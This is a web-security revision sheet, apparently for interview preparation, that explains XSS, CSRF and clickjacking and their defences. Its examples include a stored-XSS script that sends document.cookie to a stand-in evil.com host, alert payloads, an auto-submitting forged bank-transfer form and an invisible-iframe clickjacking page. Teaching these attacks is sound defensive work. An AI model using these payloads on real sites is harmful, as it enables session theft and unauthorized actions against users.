# XSS, CSRF, and Clickjacking

## ⚡ Quick Revision

**XSS (Cross-Site Scripting):**
- Attacker injects malicious scripts into trusted websites
- Three types: Stored (persistent), Reflected (non-persistent), DOM-based
- Prevention: sanitize inputs, escape outputs, use CSP, use textContent not innerHTML

**CSRF (Cross-Site Request Forgery):**
- Attacker tricks user into executing unwanted actions on authenticated site
- Exploits browser's automatic cookie sending
- Prevention: CSRF tokens, SameSite cookies, check Origin/Referer headers

**Clickjacking:**
- Attacker overlays invisible iframe to trick users into clicking
- Prevention: X-Frame-Options, CSP frame-ancestors

```javascript
// XSS vulnerability
const userInput = '<script>alert("XSS")</script>';
element.innerHTML = userInput;  // ⚠️ Dangerous

// Safe alternatives
element.textContent = userInput;  // Safe (treats as text)
element.innerText = userInput;    // Safe

// React automatically escapes
<div>{userInput}</div>  // Safe
<div dangerouslySetInnerHTML={{__html: userInput}} />  // ⚠️ Dangerous

// Sanitization library
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;  // Safe
```

**CSRF Protection:**
```javascript
// Server generates token
const csrfToken = generateToken();

// Include in forms
<form>
  <input type="hidden" name="csrf_token" value="${csrfToken}">
</form>

// Include in AJAX headers
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify(data)
});

// SameSite cookie attribute
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
```

**Clickjacking Prevention:**
```
// HTTP Headers
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN

// Or use CSP
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
```

---

## 🧠 Deep Understanding

<details>
<summary>Why this exists</summary>
These are the three most common web application vulnerabilities. They exploit trust relationships: XSS exploits user trust in a site, CSRF exploits site trust in user, clickjacking exploits user trust in UI.

Understanding these is critical for building secure web applications and passing security-focused interviews.
</details>

<details>
<summary>How it works</summary>
**XSS Attack Types:**

1. **Stored XSS:**
```javascript
// Attacker posts comment with script
const comment = '<script>fetch("evil.com?cookie=" + document.cookie)</script>';
// Stored in database
// Executed when other users view comments
```

2. **Reflected XSS:**
```javascript
// Malicious URL
https://example.com/search?q=<script>alert(1)</script>
// Server reflects input in response without sanitization
<p>Search results for: <script>alert(1)</script></p>
```

3. **DOM-based XSS:**
```javascript
// URL: https://example.com#<img src=x onerror=alert(1)>
const payload = location.hash.slice(1);
document.getElementById('content').innerHTML = payload;  // ⚠️
```

**XSS Prevention:**
```javascript
// Sanitize user input
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// Context-aware encoding
const html = escapeHtml(userInput);
const url = encodeURIComponent(userInput);
const js = JSON.stringify(userInput);

// Use frameworks (React, Vue auto-escape)
// Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random'
```

**CSRF Attack Flow:**
```
1. User logs into bank.com (gets session cookie)
2. User visits evil.com
3. evil.com contains:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="1000">
   </form>
   <script>document.forms[0].submit()</script>
4. Browser automatically includes bank.com cookies
5. Bank executes transfer (thinks it's legitimate user)
```

**CSRF Prevention:**
```javascript
// Synchronizer Token Pattern
// Server generates unique token per session
const token = crypto.randomBytes(32).toString('hex');
session.csrfToken = token;

// Validate on state-changing requests
if (req.body.csrfToken !== req.session.csrfToken) {
  throw new Error('Invalid CSRF token');
}

// SameSite Cookies (modern approach)
Set-Cookie: session=abc; SameSite=Strict
// Strict: only sent for same-site requests
// Lax: sent for top-level navigations (default)
// None: always sent (requires Secure flag)

// Double Submit Cookie Pattern
Set-Cookie: csrfToken=xyz
// Client includes token in both cookie and header
// Server validates they match
```

**Clickjacking Example:**
```html
<!-- Attacker's page (evil.com) -->
<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    opacity: 0;
    width: 100%; height: 100%;
  }
  button {
    position: absolute;
    top: 200px; left: 300px;
  }
</style>
<iframe src="https://bank.com/transfer"></iframe>
<button>Click for Prize!</button>
<!-- User thinks they're clicking button, actually clicking iframe -->
```

**Clickjacking Prevention:**
```javascript
// Client-side frame busting (not reliable)
if (top !== self) {
  top.location = self.location;
}

// Server-side headers (reliable)
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```
</details>

<details>
<summary>Common misconceptions</summary>
- Sanitizing input is not enough (also escape output)
- CSRF tokens don't need to be secret (just unpredictable and validated)
- GET requests can be vulnerable to CSRF (should never cause state changes)
- HttpOnly prevents XSS from stealing cookies but doesn't prevent XSS
- SameSite=Lax doesn't protect against all CSRF (only POST/PUT/DELETE)
- Frame busting JavaScript can be bypassed (use headers)
</details>

<details>
<summary>Interview angle</summary>
Interviewers test:
- Explaining each attack vector with examples
- Prevention strategies for each
- Difference between HttpOnly, Secure, SameSite cookie flags
- When CSP is needed vs sufficient
- Framework-specific protections (React, Angular)
- Token-based vs SameSite CSRF protection
- Real-world security incident experience
- Defense in depth approach (multiple layers)
</details>
